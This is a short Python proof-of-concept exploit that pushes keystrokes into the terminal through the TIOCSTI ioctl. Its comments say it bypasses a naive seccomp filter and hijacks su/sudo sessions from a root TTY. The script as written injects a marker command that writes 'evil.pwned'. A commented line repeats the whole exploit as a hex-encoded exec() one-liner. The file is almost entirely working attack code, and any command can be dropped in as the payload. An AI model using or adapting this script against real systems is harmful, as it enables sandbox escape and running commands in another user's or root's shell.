#! /usr/bin/env python3
# Insert characters into TTY
# Can be used to bypass naive seccomp filter that allows ioctl on FD 1 (stdout) when the input is a terminal
# and also exploit for sudo and su: https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking

import fcntl, termios

PAYLOAD =\
"""echo i am an evil attacker > evil.pwned
"""

# Insert evil characters!

for c in PAYLOAD:
    fcntl.ioctl(1, termios.TIOCSTI, c.encode())

# exec(bytes.fromhex("0a696d706f72742066636e746c2c207465726d696f732c207379730a5041594c4f41443d276563686f206920616d20616e206576696c2061747461636b6572203e206576696c2e70776e65645c6e270a666f72206320696e205041594c4f41443a0a2020202066636e746c2e696f63746c28312c207465726d696f732e54494f435354492c20632e656e636f64652829290a7379732e6578697428290a").decode())